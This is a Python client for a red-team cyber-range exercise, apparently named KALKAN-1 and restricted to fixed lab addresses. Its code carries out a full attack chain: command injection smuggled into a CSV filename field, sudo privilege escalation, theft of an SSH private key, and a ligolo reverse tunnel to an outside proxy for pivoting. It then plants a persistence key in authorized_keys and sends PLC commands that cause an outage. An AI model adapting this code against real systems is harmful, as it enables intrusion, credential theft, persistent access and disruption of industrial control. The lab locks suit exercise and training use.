"""Bounded exercise client: fixed lab destinations, real results, no fabricated success."""
import base64
import json
from pathlib import Path
import shlex
import socket
import subprocess
import sys
import time

ROOT=Path(__file__).resolve().parents[2]
sys.path.insert(0,str(ROOT))
from lab.common import load,request,write_private


def persistence_program(public):
    return '\n'.join(['import base64','from pathlib import Path',
        'p=Path.home()/".ssh/authorized_keys"','p.parent.mkdir(exist_ok=True,mode=0o700)',
        'data=base64.b64decode('+repr(public)+').decode()',
        'old=p.read_text() if p.exists() else ""',
        'if data.strip() not in old:',
        '    with p.open("a") as output:',
        '        if old and not old.endswith(chr(10)): output.write(chr(10))',
        '        output.write(data if data.endswith(chr(10)) else data+chr(10))',
        'p.chmod(0o600)'])


class RedLab:
    def __init__(self,config='/etc/kalkan/red.json'):
        self.cfg=load(config)
        if self.cfg.get('lab_id')!='KALKAN-1' or self.cfg.get('portal_url')!='https://198.18.60.1' or self.cfg.get('ssh_target')!='10.77.30.20':
            raise RuntimeError('Bu istemci yalnız sabit KALKAN-1 lab hedeflerinde çalışır.')
        self.directory=Path(self.cfg['state_dir']);self.directory.mkdir(parents=True,exist_ok=True,mode=0o700)
        health=request(self.cfg['portal_url']+'/healthz',ca=self.cfg['ca'])
        if health.get('lab_id')!='KALKAN-1' or health.get('profile')!='exercise' or not health.get('run_id'):
            raise RuntimeError('Önce WHITE yeni tur ve exercise profilini açmalıdır.')
        self.run_id=health['run_id']; self.path=self.directory/(self.run_id+'.json')
        self.state=load(self.path) if self.path.exists() else {'run_id':self.run_id,'receipts':[]}

    def require(self,number):
        if not any(row['step']==number and row['passed'] for row in self.state['receipts']):
            raise RuntimeError(f'Önce {number:02} numaralı adım doğrulanmalıdır.')

    def receipt(self,number,**facts):
        self.state['receipts'].append({'step':number,'passed':True,'time_utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),**facts})
        write_private(self.path,self.state)
        print(f'PASS {number:02} / run_id={self.run_id} / gerçek işlem sonucu doğrulandı')

    def shell(self,command):
        payload={'filename':'sample.csv >/dev/null; '+command+' #'}
        result=request(self.cfg['portal_url']+'/api/v1/validate',payload,ca=self.cfg['ca'],timeout=15)
        if result.get('returncode')!=0:raise RuntimeError('DMZ komutu başarısız; başarı kaydı yazılmadı.')
        return result['stdout']

    def python_shell(self,code,root=False):
        return self.shell(('sudo -n ' if root else '')+'/usr/bin/python3 -c '+shlex.quote(code))

    def ssh(self,command,persistent=False):
        key=self.state.get('persistence_key' if persistent else 'stolen_key')
        if not key or not Path(key).is_file():raise RuntimeError('Gerekli lab anahtarı bulunamadı.')
        args=['ssh','-o','BatchMode=yes','-o','IdentityAgent=none','-o','ConnectTimeout=5',
              '-o','StrictHostKeyChecking=yes','-o','UserKnownHostsFile='+self.cfg['known_hosts'],
              '-i',key,'svc-sync@'+self.cfg['ssh_target'],command]
        result=subprocess.run(args,text=True,capture_output=True,timeout=25)
        if result.returncode:raise RuntimeError('INT SSH işlemi başarısız: '+result.stderr[-500:])
        return result.stdout

    def run(self,number):
        if number>1:self.require(number-1)
        if number==1:
            result=json.loads(self.python_shell('import os,pwd,json;print(json.dumps({"uid":os.getuid(),"euid":os.geteuid(),"user":pwd.getpwuid(os.geteuid()).pw_name}))'))
            if result['user']!='svc-web' or result['euid']==0:raise RuntimeError('İlk shell beklenen düşük yetkili servis hesabında değildir.')
            self.receipt(number,uid=result['uid'],euid=result['euid'],user=result['user'])
        elif number==2:
            euid=int(self.python_shell('import os;print(os.geteuid())',root=True).strip())
            if euid!=0:raise RuntimeError('DMZ yerel yetki yükseltme doğrulanamadı.')
            self.receipt(number,euid=euid)
        elif number==3:
            key=self.python_shell('from pathlib import Path;print(Path("/var/lib/kalkan-portal/legacy-sync/id_ed25519").read_text(),end="")',root=True)
            if not key.startswith('-----BEGIN '+'OPENSSH PRIVATE KEY-----'):raise RuntimeError('Kullanılabilir lab SSH anahtarı alınamadı.')
            path=self.directory/(self.run_id+'-svc-sync')
            path.write_text(key);path.chmod(0o600)
            fingerprint=subprocess.check_output(['ssh-keygen','-lf',str(path)],text=True).strip()
            self.state['stolen_key']=str(path)
            self.receipt(number,fingerprint=fingerprint)
        elif number==4:
            try:
                with socket.create_connection((self.cfg['ssh_target'],22),timeout=1):
                    raise RuntimeError('Pivot öncesinde iç SSH doğrudan erişilebilir; ağ izolasyonunu düzeltin.')
            except (TimeoutError,OSError):pass
            command='nohup /opt/kalkan/bin/ligolo-agent -connect 198.18.60.20:11601 -accept-fingerprint '+shlex.quote(self.cfg['proxy_fingerprint'])+' </dev/null >/var/lib/kalkan-portal/ligolo.log 2>&1 & echo $! >/var/lib/kalkan-portal/ligolo.pid'
            self.shell(command)
            deadline=time.monotonic()+20
            while time.monotonic()<deadline:
                try:
                    with socket.create_connection((self.cfg['ssh_target'],22),timeout=1):break
                except OSError:time.sleep(.5)
            else:raise RuntimeError('Ligolo otomatik tüneli kurulmadı; proxy günlüğünü inceleyin.')
            self.receipt(number,path='DMZ agent → Kali proxy → INT TCP/22')
        elif number==5:
            result=json.loads(self.ssh("python3 -c "+shlex.quote('import os,pwd,json;print(json.dumps({"uid":os.getuid(),"user":pwd.getpwuid(os.getuid()).pw_name}))')))
            if result['user']!='svc-sync':raise RuntimeError('Beklenen svc-sync oturumu açılmadı.')
            self.receipt(number,user=result['user'],uid=result['uid'])
        elif number==6:
            key=self.directory/(self.run_id+'-persistence')
            if not key.exists():subprocess.run(['ssh-keygen','-q','-t','ed25519','-N','','-C','kalkan-persistence-'+self.run_id,'-f',str(key)],check=True)
            public=base64.b64encode(key.with_suffix(key.suffix+'.pub').read_bytes()).decode()
            code=persistence_program(public)
            self.ssh('python3 -c '+shlex.quote(code))
            self.state['persistence_key']=str(key)
            if self.ssh('id -un',persistent=True).strip()!='svc-sync':raise RuntimeError('Eklenen anahtarla ikinci oturum doğrulanamadı.')
            response=json.loads(self.ssh('cd /opt/kalkan && python3 -m lab.integrator_command session',persistent=True))
            if not response.get('ok') or response.get('run_id')!=self.run_id:raise RuntimeError('Servis API kimliği geçişi doğrulanamadı.')
            self.receipt(number,second_ssh_session=True,application_identity='integrator')
        else:
            operation={7:'position',8:'mission',9:'plc-measurement',10:'plc-command',11:'outage'}[number]
            result=json.loads(self.ssh('cd /opt/kalkan && python3 -m lab.integrator_command '+operation,persistent=True))
            if not result.get('ok') or result.get('run_id')!=self.run_id:raise RuntimeError('Uygulama işlemi doğrulanamadı.')
            self.receipt(number,operation=operation)


def entry(number):
    try:RedLab().run(number)
    except Exception as error:raise SystemExit('FAIL: '+str(error))
